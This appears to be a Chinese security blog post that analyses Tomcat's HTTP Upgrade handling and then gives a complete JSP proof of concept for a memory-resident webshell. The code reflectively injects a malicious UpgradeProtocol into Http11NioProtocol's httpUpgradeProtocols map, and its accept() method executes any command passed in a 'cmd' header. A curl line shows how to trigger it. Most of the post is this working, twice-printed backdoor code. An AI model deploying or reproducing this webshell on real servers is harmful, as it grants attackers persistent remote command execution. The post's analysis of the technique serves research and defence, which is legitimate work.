## Upgrade

推荐先看[Tomcat 架构原理解析到架构设计借鉴](https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09)

先来看下UpgradeProtocol这个接口

![image-20240710172248091](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172248091.png)

从实际应用上来说，这个接口被用于对请求的处理,处理connection: upgrade字段

![image-20240710172612068](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710172612068.png)

### 调用分析

![image-20240710173648561](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710173648561.png)

+ AbstractProcessorLight

  process方法，方法下会根据当前SocketState进行对应的相应处理，调用相应的Processor进行处理，在处理HTTP请求时，对应的Processor为Http11Processor

  ![image-20240710173835544](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710173835544.png)

+ Http11Processor

  在service方法中存在if判断

  ![image-20240710174256671](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710174256671.png)

  首先判断当前connection请求头是否为upgrade,如果是upgrade则获取请求头Upgrade字段的值，根据该值调用getUpgradeProtocol方法获取upgradeProtocol对象，并调用气accept方法

  跟进getUpgradeProtocol

+ AbstractHttp11Protocol

  getUpgradeProtocol()

  ![image-20240710175258217](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710175258217.png)

  httpUpgradeProtocols是一个hash表，通过键对值存储数据，这里获取到对应值的upgradeProtocol对象

  跟进到httpUpgradeProtocols是如何进行赋值的

  configureUpgradeProtocol()

  ![image-20240710180911934](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710180911934.png)

  在该方法下执行了相应的put,朝hash表中添加了值
  
  该字段位于request.connector.protocolHandler.httpUpgradeProtocols

### POC编写

我们的目标是获取Http11NioProcol对象，获取httpUpgradeProtocols表并向其中添加恶意类

1.获取Http11NioProcol对象

```jsp
<%
    //反射获取request对象
    Field reF = request.getClass().getDeclaredField("request");
    reF.setAccessible(true);
    Request reQ = (Request) reF.get(request);
    //获取connector
    Field coN = reQ.getClass().getDeclaredField("connector");
    coN.setAccessible(true);
    Connector connector = (Connector) coN.get(reQ);
    //获取Http11NioProtocol对象
    Field proH = connector.getClass().getDeclaredField("protocolHandler");
    proH.setAccessible(true);
    Http11NioProtocol http11NioProtocol = (Http11NioProtocol) proH.get(connector);
%>
```

2.编写恶意的upgrade类

```jsp
<%
    //实现恶意的upgrade
    class shell_upgrade implements UpgradeProtocol {

        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            String cmd = request.getHeader("cmd");
            if(cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
            return false;
        }
    }
%>
```

这里只弹一个计算机，如果要回显需要自己获取response

3.反射获取httpUpgradeProtocols,注入恶意类

```jsp
<%
    //创建一个hashmap并将恶意对象进行反射添加
    HashMap<String, UpgradeProtocol> upgradeProtocols = null;
    shell_upgrade shellUpgrade = new shell_upgrade();
	//这里需要注意，不要用错了
    Field putI = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
    putI.setAccessible(true);
    upgradeProtocols = (HashMap<String, UpgradeProtocol>) putI.get(http11NioProtocol);
    upgradeProtocols.put("uu2fu3o",shellUpgrade);
    putI.set(http11NioProtocol,upgradeProtocols);
    //curl -H "Connection: Upgrade" -H "Upgrade: uu2fu3o" -H "cmd: calc" http://localhost:8080/
%>
```

![image-20240711112127152](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240711112127152.png)

完整POC

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.catalina.connector.Request" %>r
<%@ page import="org.apache.coyote.http11.Http11NioProtocol" %>
<%@ page import="org.apache.coyote.UpgradeProtocol" %>
<%@ page import="org.apache.coyote.Processor" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
  Created by IntelliJ IDEA.
  User: Administrator
  Date: 2024/7/11
  Time: 9:50
  To change this template use File | Settings | File Templates.
--%>
<%
    //反射获取request对象
    Field reF = request.getClass().getDeclaredField("request");
    reF.setAccessible(true);
    Request reQ = (Request) reF.get(request);
    //获取connector
    Field coN = reQ.getClass().getDeclaredField("connector");
    coN.setAccessible(true);
    Connector connector = (Connector) coN.get(reQ);
    //获取Http11NioProtocol对象
    Field proH = connector.getClass().getDeclaredField("protocolHandler");
    proH.setAccessible(true);
    Http11NioProtocol http11NioProtocol = (Http11NioProtocol) proH.get(connector);
%>
<%
    //实现恶意的upgrade
    class shell_upgrade implements UpgradeProtocol {

        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            String cmd = request.getHeader("cmd");
            if(cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
            return false;
        }
    }
%>
<%
    //创建一个hashmap并将恶意对象进行反射添加
    HashMap<String, UpgradeProtocol> upgradeProtocols = null;
    shell_upgrade shellUpgrade = new shell_upgrade();
    Field putI = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
    putI.setAccessible(true);
    upgradeProtocols = (HashMap<String, UpgradeProtocol>) putI.get(http11NioProtocol);
    upgradeProtocols.put("uu2fu3o",shellUpgrade);
    putI.set(http11NioProtocol,upgradeProtocols);
    //curl -H "Connection: Upgrade" -H "Upgrade: uu2fu3o" -H "cmd: calc" http://localhost:8080/
%>

```

